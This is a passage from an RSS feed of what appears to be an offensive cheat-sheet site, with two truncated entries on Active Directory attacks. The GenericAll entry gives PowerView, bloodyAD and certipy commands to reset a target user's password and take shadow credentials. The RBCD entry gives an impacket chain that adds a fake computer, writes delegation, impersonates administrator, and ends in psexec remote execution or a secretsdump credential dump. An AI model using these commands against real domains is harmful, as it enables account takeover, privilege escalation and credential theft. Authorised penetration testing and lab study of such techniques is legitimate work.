channel.title: GenericAll on TLDRBins
channel.description: Recent content in GenericAll on TLDRBins

item.title: GenericAll
item.description: Abuse #1: Change target user password (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password Abuse #1: Change target user password (From Linux) bloodyAD python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD> Abuse #2: Get shadow credentials (From Linux) sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -k -account <TARGET_USER> -target <DC> Abuse #3 : Add user to group (From Windows) 1.

item.title: RBCD Attack
item.description: RBCD Attack (From Linux) 0. Check machine account quota nxc ldap 10.10.11.10 -u <USER> -p <PASSWORD> -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'password' -dc-ip 10.10.11.10 <DOMAIN>/<USER>:<PASSWORD> 2. Rbcd attack impacket-rbcd -delegate-to <TARGET_COMPUTER>$ -delegate-from EvilComputer$ -dc-ip <DC> -action 'write' <DOMAIN>/<USER>:<PASSWORD> 3. Impersonate sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC> '<DOMAIN>/EvilComputer:password' 4. Import ticket export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache 5. Post-Attack # Remote sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass # Or secretsdump impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator RBCD Attack (From Windows) 1.
